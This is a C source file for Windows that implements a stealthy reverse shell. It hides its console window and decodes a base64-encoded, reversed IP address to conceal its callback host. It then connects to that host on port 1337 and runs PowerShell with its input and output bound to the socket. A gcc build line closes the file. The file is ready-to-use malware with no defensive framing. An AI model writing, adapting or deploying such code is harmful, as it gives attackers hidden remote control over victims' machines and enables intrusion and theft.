#include <winsock2.h>
#include <stdio.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
#include <string.h>
#define SIZE 100
char* base64Decoder(char encoded[], int len_str)
{
	char* decoded_string;

	decoded_string = (char*)malloc(sizeof(char) * SIZE);

	int i, j, k = 0;

	// stores the bitstream.
	int num = 0;

	// count_bits stores current
	// number of bits in num.
	int count_bits = 0;

	// selects 4 characters from
	// encoded string at a time.
	// find the position of each encoded
	// character in char_set and stores in num.
	for (i = 0; i < len_str; i += 4) {
		num = 0, count_bits = 0;
		for (j = 0; j < 4; j++) {
			// make space for 6 bits.
			if (encoded[i + j] != '=') {
				num = num << 6;
				count_bits += 6;
			}

			/* Finding the position of each encoded
			character in char_set
			and storing in "num", use OR
			'|' operator to store bits.*/

			// encoded[i + j] = 'E', 'E' - 'A' = 5
			// 'E' has 5th position in char_set.
			if (encoded[i + j] >= 'A' && encoded[i + j] <= 'Z')
				num = num | (encoded[i + j] - 'A');

			// encoded[i + j] = 'e', 'e' - 'a' = 5,
			// 5 + 26 = 31, 'e' has 31st position in char_set.
			else if (encoded[i + j] >= 'a' && encoded[i + j] <= 'z')
				num = num | (encoded[i + j] - 'a' + 26);

			// encoded[i + j] = '8', '8' - '0' = 8
			// 8 + 52 = 60, '8' has 60th position in char_set.
			else if (encoded[i + j] >= '0' && encoded[i + j] <= '9')
				num = num | (encoded[i + j] - '0' + 52);

			// '+' occurs in 62nd position in char_set.
			else if (encoded[i + j] == '+')
				num = num | 62;

			// '/' occurs in 63rd position in char_set.
			else if (encoded[i + j] == '/')
				num = num | 63;

			// ( str[i + j] == '=' ) remove 2 bits
			// to delete appended bits during encoding.
			else {
				num = num >> 2;
				count_bits -= 2;
			}
		}

		while (count_bits != 0) {
			count_bits -= 8;

			// 255 in binary is 11111111
			decoded_string[k++] = (num >> count_bits) & 255;
		}
	}

	// place NULL character to mark end of string.
	decoded_string[k] = '\0';

	return decoded_string;
}
void reversestring(char *s)
{
   int length, c;
   char *begin, *end, temp;
 
   length = strlen(s);
   begin  = s;
   end    = s;
 
   for (c = 0; c < length - 1; c++)
      end++;
 
   for (c = 0; c < length/2; c++)
   {        
      temp   = *end;
      *end   = *begin;
      *begin = temp;
 
      begin++;
      end--;
   }
}
WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char port[6] = "1337";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );
    char encoded_string[] = "MzMyLjMxMS42LjE2";
    int len_str = sizeof(encoded_string) / sizeof(encoded_string[0]);
    len_str -= 1;
    char *ip_addr = base64Decoder(encoded_string, len_str);
    reversestring(ip_addr);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	
    TCHAR cmd[255] = "powershell.exe";
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);


    return 0;
}
// gcc rev.c -lwsock32 -lws2_32 -static-libgcc -o rev 